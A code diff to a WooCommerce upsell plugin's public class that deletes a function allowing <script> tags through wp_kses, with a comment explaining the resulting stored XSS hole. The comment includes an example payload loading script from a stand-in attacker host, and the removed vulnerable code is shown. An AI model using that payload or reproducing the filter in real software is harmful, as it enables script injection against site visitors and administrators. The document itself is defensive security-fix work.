@@ -4713,19 +4713,24 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	}
 
 	/**
-	 * Allow Script tags in wp_kses
+	 * REMOVED: wocuf_lite_allow_script_tags() function has been removed entirely.
 	 *
-	 * @param array $allowedposttags allowed post tags.
-	 * @return array
+	 * Security Fix: The wp_kses_allowed_html filter that this function was hooked to has been removed.
+	 * The plugin uses wp_add_inline_script() for custom JavaScript (see post_global_custom_js method),
+	 * which is the secure WordPress-recommended way to add scripts. The previous wp_kses_allowed_html
+	 * filter was creating a site-wide XSS vulnerability because:
+	 *
+	 * 1. It allowed <script> tags in the 'post' context site-wide
+	 * 2. The 'post' context is used by wp_kses_post(), content_save_pre, and excerpt_save_pre
+	 * 3. WordPress routes content from Contributors and Authors (users without unfiltered_html capability)
+	 *    through these filters when they create/edit posts
+	 * 4. This meant any Contributor or Author could inject <script src="//attacker.tld/x.js"></script>
+	 *    into post content, which would execute for administrators reviewing the content and all site visitors
+	 * 5. Comments were also affected, allowing unauthenticated attackers to inject scripts
+	 *
+	 * The fix: This function and its filter registration have been completely removed.
+	 * The plugin's functionality is not affected because wp_add_inline_script() is already being used correctly.
 	 */
-	public function wocuf_lite_allow_script_tags( $allowedposttags ) {
-		$allowedposttags['script'] = array(
-			'src'    => true,
-			'height' => true,
-			'width'  => true,
-		);
-		return $allowedposttags;
-	}
 
 	/**
 	 * Initiate Upsell Orders before processing payment in case of checkout shortcode.
